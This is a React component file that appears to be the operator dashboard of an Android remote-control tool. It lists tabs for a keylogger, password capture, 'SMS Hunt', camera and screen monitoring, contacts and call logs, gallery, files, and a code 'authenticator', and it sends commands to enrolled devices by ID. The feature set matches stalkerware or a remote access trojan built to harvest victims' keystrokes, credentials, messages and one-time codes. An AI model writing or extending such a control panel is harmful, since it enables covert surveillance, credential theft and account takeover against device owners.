import React, { Suspense, lazy, useState, useCallback } from 'react';
import CommandPanel from './CommandPanel.jsx';
import ResultPanel from './ResultPanel.jsx';
import LiveMonitor from './LiveMonitor.jsx';
import ControlCenter from './ControlCenter.jsx';

// Heavy device tools are loaded only when their tab is first opened. Once loaded,
// the panel stays mounted (display:none when inactive), so switching tabs keeps
// its local state, active stream controls, and loaded data alive.
const ScreenControl = lazy(() => import('./ScreenControl.jsx'));
const ScreenReaderView = lazy(() => import('./ScreenReaderView.jsx'));
const KeyloggerTab = lazy(() => import('./KeyloggerTab.jsx'));
const AppManager = lazy(() => import('./AppManager.jsx'));
const AppMonitorTab = lazy(() => import('./AppMonitorTab.jsx'));
const PermissionsTab = lazy(() => import('./PermissionsTab.jsx'));
const NotificationsTab = lazy(() => import('./NotificationsTab.jsx'));
const RecentActivityTab = lazy(() => import('./RecentActivityTab.jsx'));
const TaskStudio = lazy(() => import('./TaskStudio.jsx'));
const SmsHuntTab = lazy(() => import('./SmsHuntTab.jsx'));
const PasswordsTab = lazy(() => import('./PasswordsTab.jsx'));
const GestureTab = lazy(() => import('./GestureTab.jsx'));
const SMSManagerTab = lazy(() => import('./SMSManagerTab.jsx'));
const FileManagerTab = lazy(() => import('./FileManagerTab.jsx'));
const ContactsCallLogTab = lazy(() => import('./ContactsCallLogTab.jsx'));
const CameraMonitorTab = lazy(() => import('./CameraMonitorTab.jsx'));
const GalleryTab = lazy(() => import('./GalleryTab.jsx'));
const GcodeAuthenticator = lazy(() => import('./GcodeAuthenticator.jsx'));

const TABS = [
  { id: 'control_center', label: '🎮 Control Center' },
  { id: 'live_monitor',   label: '📊 Live Monitor' },
  { id: 'commands',       label: '⌨️ Commands' },
  { id: 'screen_control', label: '🖥️ Screen Control' },
  { id: 'camera_monitor', label: '📷 Camera Monitor' },
  { id: 'screen_reader',  label: '📺 Screen Reader' },
  { id: 'task_studio',    label: '🎬 Task Studio' },
  { id: 'sms_hunt',       label: '🎯 SMS Hunt' },
  { id: 'passwords',      label: '🔑 Passwords' },
  { id: 'notifications',  label: '🔔 Notifications' },
  { id: 'sms_manager',    label: '💬 SMS Manager' },
  { id: 'contacts_calls', label: '👥 Contacts & Calls' },
  { id: 'activity',       label: '📱 Activity' },
  { id: 'keylogger',      label: '⌨️ Keylogger' },
  { id: 'gallery',        label: '🖼️ Gallery' },
  { id: 'file_manager',   label: '📂 Files' },
  { id: 'app_manager',    label: '📦 App Manager' },
  { id: 'app_monitor',    label: '📡 App Monitor' },
  { id: 'permissions',    label: '🛡️ App Mode' },
  { id: 'gestures',       label: '✋ Gestures' },
  { id: 'pro_tools',      label: '🛠️ Pro Tools' },
];

const initialRefreshKeys = Object.fromEntries(TABS.map(t => [t.id, 0]));
const initialLoadedTabs = new Set(['control_center', 'live_monitor', 'commands']);

function TabLoading() {
  return (
    <div className="tab-loading" role="status" aria-live="polite">
      <span className="loading-spinner" aria-hidden="true" />
      Loading tool…
    </div>
  );
}

export default function DeviceControl({
  device, sendCommand, results, pending, onBack,
  streamFrame, cameraFrame, send, keylogPushEntries, notifPushEntries,
  activityAppEntries, smsHuntEntries, screenReaderPushData, offlineRecordingVersion,
  serverLatency, deviceLatency, gcodeVersion, galleryStream, connected,
}) {
  const [activeTab, setActiveTab]     = useState('control_center');
  const [refreshKeys, setRefreshKeys] = useState(initialRefreshKeys);
  const [galleryActive, setGalleryActive] = useState(false);
  const [loadedTabs, setLoadedTabs] = useState(initialLoadedTabs);

  const info     = device.deviceInfo || {};
  const isOnline = device.isOnline;

  const handleCommand = useCallback((command, params) => {
    sendCommand(device.deviceId, command, params);
  }, [sendCommand, device.deviceId]);

  const refreshTab = useCallback((tabId) => {
    setRefreshKeys(prev => ({ ...prev, [tabId]: (prev[tabId] || 0) + 1 }));
  }, []);

  const selectTab = useCallback((tabId) => {
    setActiveTab(tabId);
    setLoadedTabs(prev => prev.has(tabId) ? prev : new Set([...prev, tabId]));
  }, []);

  const tabVisible = (id) => ({ display: activeTab === id ? 'flex' : 'none', flexDirection: 'column', flex: 1, minHeight: 0 });

  return (
    <div className="device-control">
      <div className="dc-header">
        <button className="btn-back" onClick={onBack}>← Back</button>
        <span style={{ fontSize: 22 }}>📱</span>
        <div>
          <div className="dc-title">{device.deviceName || device.deviceId}</div>
          <div style={{ fontSize: 12, color: '#94a3b8' }}>
            {info.manufacturer} {info.model} · Android {info.androidVersion || 'N/A'}
            {info.screenWidth && ` · ${info.screenWidth}×${info.screenHeight}`}
          </div>
        </div>
        <span className={`dc-status ${isOnline ? 'online' : 'offline'}`}>
          {isOnline ? '● ONLINE' : '● OFFLINE'}
        </span>
        <button
          title="Force the device to close and re-open all connections to the server"
          onClick={() => sendCommand(device.deviceId, 'restart_connection')}
          style={{ background: '#1e1b4b', border: '1px solid #4c1d95', color: '#a78bfa', borderRadius: 6, padding: '5px 12px', fontSize: 12, cursor: 'pointer', whiteSpace: 'nowrap' }}
        >
          🔄 Restart Connection
        </button>
      </div>

      {!isOnline && (
        <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', borderRadius: 8, padding: '10px 14px', marginBottom: 16, color: '#ef4444', fontSize: 13 }}>
          ⚠️ Device is offline. Commands will fail until device reconnects.
        </div>
      )}

      <div className="pending-banner" style={{ visibility: pending.length > 0 ? 'visible' : 'hidden' }}>
        ⏳ {pending.length} command{pending.length > 1 ? 's' : ''} waiting for device response…
      </div>

      <div className="device-info-grid">
        <div className="di-item"><div className="di-label">Device ID</div><div className="di-value" style={{ fontSize: 11, fontFamily: 'monospace' }}>{device.deviceId}</div></div>
        <div className="di-item"><div className="di-label">Model</div><div className="di-value">{info.model || '—'}</div></div>
        <div className="di-item"><div className="di-label">Android</div><div className="di-value">{info.androidVersion || '—'}</div></div>
        <div className="di-item"><div className="di-label">Resolution</div><div className="di-value">{info.screenWidth ? `${info.screenWidth}×${info.screenHeight}` : '—'}</div></div>
      </div>

      <div className="dc-tabs" style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: 4 }}>
        {TABS.map(tab => (
          <button
            key={tab.id}
            className={`dc-tab-btn ${activeTab === tab.id ? 'active' : ''}`}
            onClick={() => selectTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}

        <button
          title={`Refresh ${TABS.find(t => t.id === activeTab)?.label ?? activeTab}`}
          onClick={() => refreshTab(activeTab)}
          style={{
            marginLeft: 'auto',
            background: 'rgba(99,102,241,0.15)',
            border: '1px solid rgba(99,102,241,0.4)',
            color: '#a5b4fc',
            borderRadius: 6,
            padding: '5px 12px',
            fontSize: 12,
            cursor: 'pointer',
            whiteSpace: 'nowrap',
            display: 'flex',
            alignItems: 'center',
            gap: 5,
          }}
        >
          ↺ Refresh
        </button>
      </div>

      <Suspense fallback={<TabLoading />}>
        <div style={tabVisible('control_center')}>
          <ControlCenter
            key={refreshKeys.control_center}
            device={device}
            sendCommand={sendCommand}
            results={results}
            streamFrame={streamFrame}
            send={send}
            serverLatency={serverLatency}
            deviceLatency={deviceLatency}
            onTabChange={selectTab}
            screenReaderPushData={screenReaderPushData}
            offlineRecordingVersion={offlineRecordingVersion}
            connected={connected}
          />
        </div>

      {loadedTabs.has('live_monitor') && <div style={tabVisible('live_monitor')}>
        <LiveMonitor
          key={refreshKeys.live_monitor}
          notifEntries={notifPushEntries || []}
          activityEntries={activityAppEntries || []}
          keylogEntries={keylogPushEntries || []}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>}

      {loadedTabs.has('commands') && <div style={tabVisible('commands')} className="dc-layout">
        <CommandPanel
          key={refreshKeys.commands}
          onSend={handleCommand}
          disabled={!isOnline}
          pendingCommands={pending.map(p => p.command)}
        />
        <ResultPanel results={results} />
      </div>}

      {loadedTabs.has('screen_control') && <div style={tabVisible('screen_control')}>
        <ScreenControl
          key={refreshKeys.screen_control}
          device={device}
          sendCommand={sendCommand}
          results={results}
          streamFrame={streamFrame}
          send={send}
          connected={connected}
        />
      </div>}

      {loadedTabs.has('camera_monitor') && <div style={tabVisible('camera_monitor')}>
        <CameraMonitorTab
          key={refreshKeys.camera_monitor}
          device={device}
          sendCommand={sendCommand}
          results={results}
          sseCameraFrame={cameraFrame}
          galleryActive={galleryActive}
          connected={connected}
        />
      </div>}

      {loadedTabs.has('screen_reader') && <div style={tabVisible('screen_reader')}>
        <ScreenReaderView
          key={refreshKeys.screen_reader}
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenPushData={screenReaderPushData}
          connected={connected}
        />
      </div>}

      {loadedTabs.has('task_studio') && <div style={tabVisible('task_studio')}>
        <TaskStudio
          key={refreshKeys.task_studio}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>}

      {loadedTabs.has('sms_hunt') && <div style={tabVisible('sms_hunt')}>
        <SmsHuntTab
          key={refreshKeys.sms_hunt}
          device={device}
          incomingMessages={smsHuntEntries || []}
        />
      </div>}

      {loadedTabs.has('passwords') && <div style={tabVisible('passwords')}>
        <PasswordsTab
          key={refreshKeys.passwords}
          device={device}
          sendCommand={sendCommand}
          results={results}
          keylogPushEntries={keylogPushEntries || []}
        />
      </div>}

      {loadedTabs.has('notifications') && <div style={tabVisible('notifications')}>
        <NotificationsTab
          key={refreshKeys.notifications}
          device={device}
          sendCommand={sendCommand}
          results={results}
          notifPushEntries={notifPushEntries || []}
        />
      </div>}

      {loadedTabs.has('sms_manager') && <div style={tabVisible('sms_manager')}>
        <SMSManagerTab
          key={refreshKeys.sms_manager}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>}

      {loadedTabs.has('contacts_calls') && <div style={tabVisible('contacts_calls')}>
        <ContactsCallLogTab
          key={refreshKeys.contacts_calls}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>}

      {loadedTabs.has('activity') && <div style={tabVisible('activity')}>
        <RecentActivityTab
          key={refreshKeys.activity}
          device={device}
          activityEntries={activityAppEntries || []}
        />
      </div>}

      {loadedTabs.has('keylogger') && <div style={tabVisible('keylogger')}>
        <KeyloggerTab
          key={refreshKeys.keylogger}
          device={device}
          sendCommand={sendCommand}
          results={results}
          keylogPushEntries={keylogPushEntries || []}
        />
      </div>}

      {loadedTabs.has('gallery') && <div style={tabVisible('gallery')}>
        <GalleryTab
          key={refreshKeys.gallery}
          device={device}
          sendCommand={sendCommand}
          results={results}
          galleryStream={galleryStream}
          onGalleryActive={setGalleryActive}
        />
      </div>}

      {loadedTabs.has('file_manager') && <div style={tabVisible('file_manager')}>
        <FileManagerTab
          key={refreshKeys.file_manager}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>}

      {loadedTabs.has('app_manager') && <div style={tabVisible('app_manager')}>
        <AppManager
          key={refreshKeys.app_manager}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>}

      {loadedTabs.has('app_monitor') && <div style={tabVisible('app_monitor')}>
        <AppMonitorTab
          key={refreshKeys.app_monitor}
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenReaderPushData={screenReaderPushData}
        />
      </div>}

      {loadedTabs.has('permissions') && <div style={tabVisible('permissions')}>
        <PermissionsTab
          key={refreshKeys.permissions}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>}

      {loadedTabs.has('gestures') && <div style={tabVisible('gestures')}>
        <GestureTab
          key={refreshKeys.gestures}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      </div>}

      {loadedTabs.has('pro_tools') && <div style={tabVisible('pro_tools')}>
        <GcodeAuthenticator
          key={refreshKeys.pro_tools}
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenReaderPushData={screenReaderPushData}
          gcodeVersion={gcodeVersion}
        />
      </div>}
      </Suspense>
    </div>
  );
}
